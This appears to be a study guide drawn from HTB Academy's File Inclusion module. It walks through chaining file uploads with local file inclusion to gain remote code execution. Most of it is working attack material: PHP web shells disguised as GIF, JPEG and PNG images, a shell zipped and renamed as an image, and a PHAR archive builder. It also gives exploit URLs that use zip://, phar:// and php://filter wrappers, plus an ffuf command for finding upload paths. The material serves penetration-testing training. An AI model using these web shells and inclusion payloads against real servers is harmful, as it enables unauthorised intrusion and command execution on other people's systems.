# File Upload + LFI Combinations - HTB Academy Guide

## Overview

Combining file upload vulnerabilities with LFI creates powerful attack vectors for achieving RCE when direct wrappers are not available.

**Attack Flow:**
1. **Upload malicious file** disguised as legitimate content
2. **Discover upload location** via directory traversal or source disclosure  
3. **Include uploaded file** via LFI vulnerability
4. **Execute embedded code** and achieve RCE

---

## Method 1: Malicious Image Upload

### Technique: PHP in Image Files

**Step 1: Create Malicious Image**
```bash
# GIF header with embedded PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG with PHP payload
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg

# PNG with embedded shell
cp legitimate.png shell.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.png
```

**Step 2: Upload via Web Interface**
- Upload through file upload forms
- Bypass extension filters
- Discover upload directory location

**Step 3: Execute via LFI**
```bash
# Include uploaded image as PHP
http://target.com/lfi.php?file=../../../../var/www/uploads/shell.gif&cmd=id
```

---

## Method 2: Zip Wrapper Technique

### Creating Zip-based Payloads

**Step 1: Create PHP Shell**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
mv shell.zip shell.jpg  # Disguise as image
```

**Step 2: Upload and Execute**
```bash
# Upload disguised zip file
# Then include via zip wrapper
http://target.com/lfi.php?file=zip://path/to/shell.jpg%23shell.php&cmd=whoami
```

---

## Method 3: Phar Wrapper Technique

### PHAR Archive Exploitation

**Step 1: Create PHAR Archive**
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

**Step 2: Execute via PHAR Wrapper**
```bash
# Include PHAR content
http://target.com/lfi.php?file=phar://uploads/shell.jpg/shell.txt&cmd=id
```

---

## Upload Location Discovery

### Common Upload Directories
```bash
/var/www/html/uploads/
/var/www/html/files/
/var/www/html/images/
/tmp/
./uploads/
../uploads/
```

### Discovery Techniques
```bash
# Source code disclosure for paths
php://filter/convert.base64-encode/resource=upload.php

# Directory traversal enumeration
ffuf -w directories.txt:FUZZ -u "http://target.com/lfi.php?file=FUZZ/shell.gif"
```

---

*[Content continues with more detailed techniques...]*

*This guide covers file upload + LFI combination techniques from HTB Academy's File Inclusion module.* 